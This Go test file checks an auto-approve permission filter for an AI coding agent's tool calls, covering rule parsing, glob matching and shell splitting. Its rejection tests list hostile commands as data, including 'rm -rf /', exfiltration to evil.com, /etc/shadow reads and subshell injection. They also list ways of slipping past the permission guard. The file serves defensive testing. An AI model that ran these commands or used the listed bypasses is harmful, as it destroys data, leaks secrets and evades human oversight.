package ccstream

import (
	"encoding/json"
	"testing"
)

// TestParseAutoApproveRule verifies that rule strings are split correctly into
// tool name and pattern components.
func TestParseAutoApproveRule(t *testing.T) {
	tests := []struct {
		rule     string
		wantTool string
		wantPat  string
	}{
		{"Read", "Read", ""},
		{"Bash:ls", "Bash", "ls"},
		{"Bash:git -C /home/rich/git/foci *", "Bash", "git -C /home/rich/git/foci *"},
		{"Edit:/home/foci/clutch/*", "Edit", "/home/foci/clutch/*"},
		{"Bash:cd /tmp && make *", "Bash", "cd /tmp && make *"},
	}
	for _, tt := range tests {
		r := parseAutoApproveRule(tt.rule)
		if r.toolName != tt.wantTool {
			t.Errorf("parseAutoApproveRule(%q).toolName = %q, want %q", tt.rule, r.toolName, tt.wantTool)
		}
		if r.pattern != tt.wantPat {
			t.Errorf("parseAutoApproveRule(%q).pattern = %q, want %q", tt.rule, r.pattern, tt.wantPat)
		}
	}
}

// TestGlobMatch exercises the simple glob matcher with various patterns
// including wildcards, question marks, and literal matching.
func TestGlobMatch(t *testing.T) {
	tests := []struct {
		pattern string
		str     string
		want    bool
	}{
		// Exact match.
		{"ls", "ls", true},
		{"ls", "cat", false},
		// Star matches any chars.
		{"git *", "git status", true},
		{"git *", "git log --oneline", true},
		{"git *", "git", false},
		{"*", "", true},
		{"*", "anything", true},
		// Star in middle.
		{"cd /tmp && git *", "cd /tmp && git push", true},
		{"cd /tmp && git *", "cd /tmp && make build", false},
		// Question mark matches single char.
		{"ls -?", "ls -l", true},
		{"ls -?", "ls -la", false},
		// Path matching (star matches /).
		{"/home/foci/*", "/home/foci/clutch/file.go", true},
		{"/home/foci/*", "/home/foci/", true},
		{"/home/foci/*", "/home/other/file.go", false},
		// Multiple stars.
		{"git *-C */foci *", "git -C /home/rich/git/foci status", true}, // * before -C matches empty string
		// Empty pattern and string.
		{"", "", true},
		{"*", "", true},
		{"?", "", false},
	}
	for _, tt := range tests {
		got := globMatch(tt.pattern, tt.str)
		if got != tt.want {
			t.Errorf("globMatch(%q, %q) = %v, want %v", tt.pattern, tt.str, got, tt.want)
		}
	}
}

// TestMatchPattern verifies the combined prefix/glob matching logic used
// for auto-approve rule patterns.
func TestMatchPattern(t *testing.T) {
	tests := []struct {
		pattern string
		str     string
		want    bool
	}{
		// Prefix match (no glob chars): exact or with space boundary.
		{"ls", "ls", true},
		{"ls", "ls -la /tmp", true},
		{"ls", "lsblk", false}, // not a word boundary
		{"ls", "l", false},
		{"sed -n", "sed -n '1,10p' file.txt", true},
		{"sed -n", "sed -i 's/a/b/' file.txt", false},
		{"sed", "sed -n 's/foo/bar/'", true},
		{"sed", "sed 's/foo/bar/'", true},
		// Glob match (contains * or ?).
		{"git -C /home/foci *", "git -C /home/foci status", true},
		{"git -C /home/foci *", "git -C /home/other status", false},
		{"gcalcli *", "gcalcli agenda", true},
		{"gcalcli *", "gcalcli", false}, // * requires at least empty after space
	}
	for _, tt := range tests {
		got := matchPattern(tt.pattern, tt.str)
		if got != tt.want {
			t.Errorf("matchPattern(%q, %q) = %v, want %v", tt.pattern, tt.str, got, tt.want)
		}
	}
}

// TestExtractMatchString verifies that the correct field is extracted from
// tool input JSON for different tool types.
func TestExtractMatchString(t *testing.T) {
	tests := []struct {
		toolName string
		input    string
		want     string
	}{
		{"Bash", `{"command":"ls -la"}`, "ls -la"},
		{"Edit", `{"file_path":"/tmp/foo.go","old_string":"a","new_string":"b"}`, "/tmp/foo.go"},
		{"Write", `{"file_path":"/tmp/bar.txt","content":"hello"}`, "/tmp/bar.txt"},
		{"Read", `{"file_path":"/tmp/baz.txt"}`, "/tmp/baz.txt"},
		{"NotebookEdit", `{"file_path":"/tmp/nb.ipynb"}`, "/tmp/nb.ipynb"},
		{"Glob", `{"pattern":"**/*.go","path":"/src"}`, "**/*.go"},
		{"Grep", `{"pattern":"TODO","path":"/src"}`, "TODO"},
		{"WebFetch", `{"url":"https://example.com"}`, "https://example.com"},
		{"WebSearch", `{"query":"golang generics"}`, "golang generics"},
		{"Search", `{"query":"hello"}`, ""},  // Search has no match key
		{"Bash", `{}`, ""},
		{"Bash", `invalid json`, ""},
		{"Bash", ``, ""},
	}
	for _, tt := range tests {
		got := extractMatchString(tt.toolName, json.RawMessage(tt.input))
		if got != tt.want {
			t.Errorf("extractMatchString(%q, %s) = %q, want %q", tt.toolName, tt.input, got, tt.want)
		}
	}
}

// TestMatchAutoApprove exercises the full rule-matching pipeline with parsed
// rules, covering tool-name-only rules, Bash command patterns, Edit file
// patterns, shell-chaining safety, and non-matching cases.
func TestMatchAutoApprove(t *testing.T) {
	rules := parseAutoApproveRules([]string{
		"Read",                              // tool-name only
		"Bash:ls",                           // prefix match
		"Bash:git -C /home/rich/git/foci *", // glob match
		"Bash:cd /home/rich/git/foci",       // prefix match (used in chained commands)
		"Edit:/home/foci/clutch/*",          // file path glob
		"Bash:gcalcli *",                    // glob match
		"Bash:mkdir",                        // prefix match
	})

	tests := []struct {
		tool  string
		input string
		want  bool
	}{
		// Tool-name-only: Read matches any input.
		{"Read", `{"file_path":"/etc/passwd"}`, true},
		{"Read", `{}`, true},
		// Bash prefix: ls
		{"Bash", `{"command":"ls -la /tmp"}`, true},
		{"Bash", `{"command":"ls"}`, true},
		{"Bash", `{"command":"lsblk"}`, false},
		// Bash glob: git -C
		{"Bash", `{"command":"git -C /home/rich/git/foci status"}`, true},
		{"Bash", `{"command":"git -C /home/rich/git/foci log --oneline"}`, true},
		{"Bash", `{"command":"git -C /home/other/repo status"}`, false},
		// Edit glob: workspace path
		{"Edit", `{"file_path":"/home/foci/clutch/main.go"}`, true},
		{"Edit", `{"file_path":"/home/foci/other/main.go"}`, false},
		// Bash glob: gcalcli
		{"Bash", `{"command":"gcalcli agenda"}`, true},
		// Safe chained commands: every segment matches a rule.
		{"Bash", `{"command":"cd /home/rich/git/foci && ls -la"}`, true},
		{"Bash", `{"command":"cd /home/rich/git/foci && git -C /home/rich/git/foci status"}`, true},
		{"Bash", `{"command":"ls /tmp ; ls /var"}`, true},
		{"Bash", `{"command":"mkdir -p /tmp/foo && ls"}`, true},
		// Piped: both sides must match.
		{"Bash", `{"command":"ls /tmp | grep foo"}`, false},
		// ATTACK: safe prefix chained with dangerous command → rejected.
		{"Bash", `{"command":"git -C /home/rich/git/foci status && rm -rf /"}`, false},
		{"Bash", `{"command":"ls -la ; curl evil.com"}`, false},
		{"Bash", `{"command":"cd /home/rich/git/foci && sudo rm -rf /"}`, false},
		// Shell control flow: keywords stripped, inner commands validated.
		{"Bash", `{"command":"for i in 1 2 3; do ls -la; done"}`, true},
		{"Bash", `{"command":"for f in *.go; do ls $f; done"}`, true},
		// Nested loop — second level not stripped, falls through to prompting.
		{"Bash", `{"command":"for i in 1; do for j in a; do ls; done; done"}`, false},
		// Loop body with unsafe command — inner command validated.
		{"Bash", `{"command":"for f in *; do rm -rf $f; done"}`, false},
		// ATTACK: command substitution in for header — rejected by splitShellCommand.
		{"Bash", `{"command":"for i in $(rm -rf /); do ls; done"}`, false},
		// if/then/else with safe commands (all matching rules in this test).
		{"Bash", `{"command":"if ls /tmp; then ls -la; else ls /var; fi"}`, true},
		// if/then with unsafe command in body.
		{"Bash", `{"command":"if ls /tmp; then rm -rf /; fi"}`, false},
		// ATTACK: subshell injection → rejected (splitShellCommand returns nil).
		{"Bash", `{"command":"ls $(rm -rf /)"}`, false},
		{"Bash", `{"command":"ls ` + "`rm -rf /`" + `"}`, false},
		// No matching rule.
		{"Bash", `{"command":"rm -rf /"}`, false},
		{"Write", `{"file_path":"/etc/shadow"}`, false},
		{"Unknown", `{}`, false},
	}
	for _, tt := range tests {
		got := matchAutoApprove(rules, tt.tool, json.RawMessage(tt.input))
		if got != tt.want {
			t.Errorf("matchAutoApprove(rules, %q, %s) = %v, want %v", tt.tool, tt.input, got, tt.want)
		}
	}
}

// TestStripShellKeyword verifies that shell control-flow keywords are
// correctly stripped from segments, leaving the inner command for validation.
// Structural segments (for...in..., done, fi, bare keywords) return skip=true.
func TestStripShellKeyword(t *testing.T) {
	tests := []struct {
		segment  string
		wantInner string
		wantSkip  bool
	}{
		// Structural closing keywords — skip entirely.
		{"done", "", true},
		{"fi", "", true},
		// for...in... loop headers — skip (no command execution).
		{"for i in 1 2 3", "", true},
		{"for f in *.go", "", true},
		{"for id in 5 8 45 56", "", true},
		// Bare keywords with no command — skip.
		{"do", "", true},
		{"then", "", true},
		{"else", "", true},
		{"if", "", true},
		{"while", "", true},
		// Command-preceding keywords — strip and return inner command.
		{"do echo hello", "echo hello", false},
		{"do foci_todo get --id 5", "foci_todo get --id 5", false},
		{"then echo yes", "echo yes", false},
		{"else echo no", "echo no", false},
		{"elif test -f /tmp/x", "test -f /tmp/x", false},
		{"if test -f /tmp/x", "test -f /tmp/x", false},
		{"while true", "true", false},
		{"until false", "false", false},
		// Non-keyword segments — pass through unchanged.
		{"ls -la", "ls -la", false},
		{"echo hello", "echo hello", false},
		{"git status", "git status", false},
	}
	for _, tt := range tests {
		inner, skip := stripShellKeyword(tt.segment)
		if skip != tt.wantSkip {
			t.Errorf("stripShellKeyword(%q) skip = %v, want %v", tt.segment, skip, tt.wantSkip)
		}
		if inner != tt.wantInner {
			t.Errorf("stripShellKeyword(%q) inner = %q, want %q", tt.segment, inner, tt.wantInner)
		}
	}
}

// TestCommonReadonlyRulesParseSuccessfully ensures all built-in common readonly
// rules parse without error and have valid structure.
func TestCommonReadonlyRulesParseSuccessfully(t *testing.T) {
	parsed := parseAutoApproveRules(CommonReadonlyRules)
	if len(parsed) != len(CommonReadonlyRules) {
		t.Fatalf("expected %d parsed rules, got %d", len(CommonReadonlyRules), len(parsed))
	}
	for i, r := range parsed {
		if r.toolName == "" {
			t.Errorf("CommonReadonlyRules[%d] = %q: empty tool name", i, CommonReadonlyRules[i])
		}
	}
}

// TestCommonSafeWriteRulesParseSuccessfully ensures the opt-in safe-write rules
// parse cleanly and match their intended commands. Guards against typos in the
// list and regressions in prefix-matching behaviour.
func TestCommonSafeWriteRulesParseSuccessfully(t *testing.T) {
	parsed := parseAutoApproveRules(CommonSafeWriteRules)
	if len(parsed) != len(CommonSafeWriteRules) {
		t.Fatalf("expected %d parsed rules, got %d", len(CommonSafeWriteRules), len(parsed))
	}
	for i, r := range parsed {
		if r.toolName == "" {
			t.Errorf("CommonSafeWriteRules[%d] = %q: empty tool name", i, CommonSafeWriteRules[i])
		}
	}

	safe := []string{
		`{"command":"curl https://example.com"}`,
		`{"command":"wget https://example.com/file"}`,
		`{"command":"mkdir -p /tmp/foo"}`,
		`{"command":"touch /tmp/foo/bar"}`,
	}
	for _, input := range safe {
		if !matchAutoApprove(parsed, "Bash", json.RawMessage(input)) {
			t.Errorf("safe-write should match Bash %s", input)
		}
	}

	// The safe-write list must not leak readonly approvals — "ls" should not
	// match when only safe-write rules are loaded.
	if matchAutoApprove(parsed, "Bash", json.RawMessage(`{"command":"ls"}`)) {
		t.Error("safe-write rules should not match unrelated commands like ls")
	}
}

// TestCommonReadonlyMatchesSafeCommands verifies that the built-in readonly
// rules correctly match a sample of safe commands.
func TestCommonReadonlyMatchesSafeCommands(t *testing.T) {
	rules := parseAutoApproveRules(CommonReadonlyRules)
	safe := []struct {
		tool  string
		input string
	}{
		{"Read", `{"path":"/tmp/file.txt"}`},
		{"Glob", `{"pattern":"*.go"}`},
		{"Grep", `{"pattern":"TODO"}`},
		{"Search", `{"query":"hello"}`},
		{"WebSearch", `{"query":"golang"}`},
		{"WebFetch", `{"url":"https://example.com"}`},
		{"Bash", `{"command":"ls -la"}`},
		{"Bash", `{"command":"cat /etc/hosts"}`},
		{"Bash", `{"command":"grep -r pattern ."}`},
		{"Bash", `{"command":"rg --type go TODO"}`},
		{"Bash", `{"command":"jq .name package.json"}`},
		{"Bash", `{"command":"foci_todo list"}`},
		// sed without -i is read-only.
		{"Bash", `{"command":"sed 's/foo/bar/'"}`},
		{"Bash", `{"command":"sed -n '1,10p' file.txt"}`},
		{"Bash", `{"command":"sed -e 's/a/b/' -e 's/c/d/'"}`},
		// find without -exec/-delete is read-only.
		{"Bash", `{"command":"find . -name '*.go'"}`},
		{"Bash", `{"command":"find /tmp -type f -name '*.log'"}`},
		{"Bash", `{"command":"find . -maxdepth 2 -print0"}`},
		// Shell test expressions — purely conditional, no side effects.
		{"Bash", `{"command":"test -f /tmp/file.txt"}`},
		{"Bash", `{"command":"[ -f /tmp/file.txt ]"}`},
		{"Bash", `{"command":"[[ -f /tmp/file.txt ]]"}`},
		// if/then with test expressions.
		{"Bash", `{"command":"if [ -f /tmp/file.txt ]; then echo exists; fi"}`},
		{"Bash", `{"command":"if [[ -d /tmp ]]; then ls /tmp; fi"}`},
		// for loop with safe body commands.
		{"Bash", `{"command":"for id in 5 8 45; do foci_todo get --id $id; done"}`},
		{"Bash", `{"command":"for f in *.log; do head -5 $f; echo '---'; done"}`},
	}
	for _, tt := range safe {
		if !matchAutoApprove(rules, tt.tool, json.RawMessage(tt.input)) {
			t.Errorf("common readonly should match %s %s", tt.tool, tt.input)
		}
	}
}

// TestSplitShellCommand verifies that commands are correctly split on shell
// operators while respecting quotes and escapes.
func TestSplitShellCommand(t *testing.T) {
	tests := []struct {
		cmd  string
		want []string
	}{
		// Simple command.
		{"ls -la", []string{"ls -la"}},
		// && splitting.
		{"cd /tmp && ls", []string{"cd /tmp", "ls"}},
		// || splitting.
		{"test -f x || echo missing", []string{"test -f x", "echo missing"}},
		// ; splitting.
		{"ls; pwd", []string{"ls", "pwd"}},
		// | splitting.
		{"cat file | grep foo", []string{"cat file", "grep foo"}},
		// Multiple operators.
		{"cd /tmp && ls -la ; pwd", []string{"cd /tmp", "ls -la", "pwd"}},
		// Quoted strings preserved (operators inside quotes not split).
		{`echo "hello && world"`, []string{`echo "hello && world"`}},
		{`echo 'a; b'`, []string{`echo 'a; b'`}},
		// Backslash escape.
		{`echo hello\;world`, []string{`echo hello\;world`}},
		// Subshell → nil (fail safe).
		{"echo $(whoami)", nil},
		{"echo `whoami`", nil},
		// Empty input.
		{"", nil},
		{"  ", nil},
	}
	for _, tt := range tests {
		got := splitShellCommand(tt.cmd)
		if tt.want == nil {
			if got != nil {
				t.Errorf("splitShellCommand(%q) = %v, want nil", tt.cmd, got)
			}
			continue
		}
		if len(got) != len(tt.want) {
			t.Errorf("splitShellCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
			continue
		}
		for i := range tt.want {
			if got[i] != tt.want[i] {
				t.Errorf("splitShellCommand(%q)[%d] = %q, want %q", tt.cmd, i, got[i], tt.want[i])
			}
		}
	}
}

// TestTokenizeCommand verifies that command strings are split into tokens
// correctly, respecting quotes, escapes, and whitespace.
func TestTokenizeCommand(t *testing.T) {
	tests := []struct {
		cmd  string
		want []string
	}{
		// Simple command.
		{"ls -la", []string{"ls", "-la"}},
		// Multiple spaces.
		{"sed  -n  '1,10p'", []string{"sed", "-n", "'1,10p'"}},
		// Single-quoted argument preserved.
		{"sed -n 's/foo/bar/'", []string{"sed", "-n", "'s/foo/bar/'"}},
		// Double-quoted argument preserved.
		{`sed -n "s/foo/bar/"`, []string{"sed", "-n", `"s/foo/bar/"`}},
		// Backslash escape.
		{`echo hello\ world`, []string{"echo", "hello world"}},
		// Tab separation.
		{"ls\t-la", []string{"ls", "-la"}},
		// Empty string.
		{"", nil},
		// Whitespace only.
		{"   ", nil},
	}
	for _, tt := range tests {
		got := tokenizeCommand(tt.cmd)
		if tt.want == nil {
			if got != nil {
				t.Errorf("tokenizeCommand(%q) = %v, want nil", tt.cmd, got)
			}
			continue
		}
		if len(got) != len(tt.want) {
			t.Errorf("tokenizeCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
			continue
		}
		for i := range tt.want {
			if got[i] != tt.want[i] {
				t.Errorf("tokenizeCommand(%q)[%d] = %q, want %q", tt.cmd, i, got[i], tt.want[i])
			}
		}
	}
}

// TestContainsUnsafeFlags verifies detection of flags that make an otherwise
// safe command unsafe (e.g. sed -i). Covers standalone flags, bundled short
// flags, long flags with and without values, path-qualified commands, and
// confirms that non-registered commands are never flagged.
func TestContainsUnsafeFlags(t *testing.T) {
	tests := []struct {
		segment string
		want    bool
	}{
		// Safe sed variants — no -i flag.
		{"sed 's/foo/bar/'", false},
		{"sed -n 's/foo/bar/'", false},
		{"sed -n -e 's/foo/bar/' -e 's/baz/qux/'", false},
		{"sed -e 's/foo/bar/'", false},
		// Unsafe: standalone -i.
		{"sed -i 's/foo/bar/' file.txt", true},
		// Unsafe: -i with backup suffix (no space).
		{"sed -i.bak 's/foo/bar/' file.txt", true},
		// Unsafe: bundled flags containing i.
		{"sed -ni 's/foo/bar/' file.txt", true},
		{"sed -in 's/foo/bar/' file.txt", true},
		// Unsafe: long flag --in-place.
		{"sed --in-place 's/foo/bar/' file.txt", true},
		// Unsafe: long flag with value --in-place=.bak.
		{"sed --in-place=.bak 's/foo/bar/' file.txt", true},
		// Unsafe: -i after other flags.
		{"sed -n -i 's/foo/bar/' file.txt", true},
		// Safe: path-qualified sed without -i.
		{"/usr/bin/sed -n 's/foo/bar/'", false},
		// Unsafe: path-qualified sed with -i.
		{"/usr/bin/sed -i 's/foo/bar/' file.txt", true},
		// Safe find variants — no exec/delete actions.
		{"find . -name '*.go'", false},
		{"find /tmp -type f -name '*.log'", false},
		{"find . -maxdepth 2 -print", false},
		{"find . -name '*.go' -print0", false},
		// Unsafe find: -exec runs arbitrary commands.
		{"find . -name '*.go' -exec rm {} \\;", true},
		// Unsafe find: -execdir.
		{"find . -name '*.go' -execdir cat {} \\;", true},
		// Unsafe find: -delete removes matched files.
		{"find . -name '*.tmp' -delete", true},
		// Unsafe find: -ok (interactive exec, still dangerous).
		{"find . -name '*.go' -ok rm {} \\;", true},
		// Unsafe find: -okdir.
		{"find . -name '*.go' -okdir rm {} \\;", true},
		// Path-qualified find with -exec.
		{"/usr/bin/find . -exec cat {} +", true},
		// Commands not in unsafeFlags — never flagged.
		{"grep -i pattern file.txt", false},
		{"ls -la", false},
		{"git -C /tmp status", false},
		// Empty segment.
		{"", false},
	}
	for _, tt := range tests {
		got := containsUnsafeFlags(tt.segment)
		if got != tt.want {
			t.Errorf("containsUnsafeFlags(%q) = %v, want %v", tt.segment, got, tt.want)
		}
	}
}

// TestCommonReadonlyRejectsUnsafe verifies that the built-in readonly rules
// do NOT match dangerous commands.
func TestCommonReadonlyRejectsUnsafe(t *testing.T) {
	rules := parseAutoApproveRules(CommonReadonlyRules)
	unsafe := []struct {
		tool  string
		input string
	}{
		{"Bash", `{"command":"rm -rf /"}`},
		{"Bash", `{"command":"sudo reboot"}`},
		{"Bash", `{"command":"chmod 777 /etc/shadow"}`},
		{"Bash", `{"command":"ls && rm -rf /"}`},         // safe prefix + dangerous chain
		{"Bash", `{"command":"cat /etc/hosts | sh"}`},    // safe prefix piped to shell
		{"Bash", `{"command":"echo hello; curl evil"}`},  // safe prefix + dangerous chain
		{"Bash", `{"command":"ls $(rm -rf /)"}`},         // subshell injection
		// sed with -i is in-place edit — must be rejected.
		{"Bash", `{"command":"sed -i 's/foo/bar/' file.txt"}`},
		{"Bash", `{"command":"sed -ni 's/foo/bar/' file.txt"}`},
		{"Bash", `{"command":"sed --in-place 's/foo/bar/' file.txt"}`},
		{"Bash", `{"command":"sed -i.bak 's/foo/bar/' file.txt"}`},
		// find with -exec/-delete must be rejected.
		{"Bash", `{"command":"find . -name '*.tmp' -delete"}`},
		{"Bash", `{"command":"find . -name '*.go' -exec rm {} \\;"}`},
		{"Bash", `{"command":"find . -execdir cat {} +"}`},
		// for loop with unsafe body.
		{"Bash", `{"command":"for f in /tmp/*.txt; do rm \"$f\"; done"}`},
		// env can run arbitrary commands — bypass via command execution.
		{"Bash", `{"command":"env rm /tmp/test.txt"}`},
		{"Bash", `{"command":"env bash -c 'rm -rf /tmp'"}`},
		// sort -o writes output to file — bypass via file write.
		{"Bash", `{"command":"sort -o /tmp/overwritten.txt /etc/passwd"}`},
		// Shell redirects write files — bypass via redirect operator.
		{"Bash", `{"command":"cat /etc/passwd > /tmp/stolen.txt"}`},
		{"Bash", `{"command":"echo pwned >> /tmp/append.txt"}`},
		{"Bash", `{"command":"ls -la > /tmp/listing.txt"}`},
		// awk has built-in command execution and file I/O.
		{"Bash", `{"command":"awk 'BEGIN{system(\"rm file\")}'"}` },
		{"Bash", `{"command":"awk '{print > \"/tmp/stolen\"}' /etc/passwd"}`},
		// sed w command writes to file without -i.
		{"Bash", `{"command":"sed 'w /tmp/stolen.txt' /etc/shadow"}`},
		// sed e command executes shell commands (GNU extension).
		{"Bash", `{"command":"sed -e '1e rm file' /dev/null"}`},
		// Absolute paths bypass command-name matching.
		{"Bash", `{"command":"/bin/rm -rf /"}`},
		{"Bash", `{"command":"/usr/bin/env rm file"}`},
		// find -fprint writes matching paths to a file.
		{"Bash", `{"command":"find /etc -name shadow -fprint /tmp/found"}`},
		// Command wrappers execute arbitrary commands.
		{"Bash", `{"command":"nice rm -rf /tmp"}`},
		{"Bash", `{"command":"timeout 10 rm file"}`},
		{"Bash", `{"command":"nohup curl http://evil.com/exfil"}`},
		// Brace groups and subshells bypass operator splitting.
		{"Bash", `{"command":"{ rm -rf /; }"}`},
		{"Bash", `{"command":"(rm -rf /)"}`},
		// Pipe to shell interpreter.
		{"Bash", `{"command":"echo 'rm file' | sh"}`},
		{"Bash", `{"command":"echo 'rm file' | bash"}`},
		// Command wrappers — run arbitrary commands.
		{"Bash", `{"command":"time rm file"}`},
		{"Bash", `{"command":"nohup rm file"}`},
		{"Bash", `{"command":"strace -o /dev/null rm file"}`},
		{"Bash", `{"command":"watch -n1 rm file"}`},
		{"Bash", `{"command":"flock /tmp/lock rm file"}`},
		{"Bash", `{"command":"script -c 'rm file' /dev/null"}`},
		// Absolute paths bypass command-name matching.
		{"Bash", `{"command":"/bin/rm -rf /"}`},
		{"Bash", `{"command":"/usr/bin/env rm file"}`},
		// Shell interpreters.
		{"Bash", `{"command":"bash -c 'rm file'"}`},
		{"Bash", `{"command":"sh -c 'rm file'"}`},
		// Interpreter escapes.
		{"Bash", `{"command":"python3 -c \"import os; os.system('rm file')\""}`},
		{"Bash", `{"command":"perl -e 'system(\"rm file\")'"}`},
		{"Bash", `{"command":"ruby -e 'system(\"rm file\")'"}`},
		{"Bash", `{"command":"node -e \"require('child_process').execSync('rm file')\""}`},
		// Bash builtins that execute code.
		{"Bash", `{"command":"eval 'rm file'"}`},
		{"Bash", `{"command":"exec rm file"}`},
		{"Bash", `{"command":"source /tmp/evil.sh"}`},
		{"Bash", `{"command":". /tmp/evil.sh"}`},
		// Subshell and brace groups.
		{"Bash", `{"command":"{ rm -rf /; }"}`},
		{"Bash", `{"command":"(rm -rf /)"}`},
		// Variable in command position.
		{"Bash", `{"command":"cmd=rm; $cmd file"}`},
		// Heredoc to file.
		{"Bash", `{"command":"cat << 'EOF' > /tmp/evil.sh\n#!/bin/sh\nrm -rf /\nEOF"}`},
		// Clobber redirect variant.
		{"Bash", `{"command":"echo data >| /tmp/clobbered"}`},
		{"Edit", `{"file_path":"/etc/passwd"}`},
		{"Write", `{"file_path":"/tmp/exploit.sh"}`},
	}
	for _, tt := range unsafe {
		if matchAutoApprove(rules, tt.tool, json.RawMessage(tt.input)) {
			t.Errorf("common readonly should NOT match %s %s", tt.tool, tt.input)
		}
	}
}
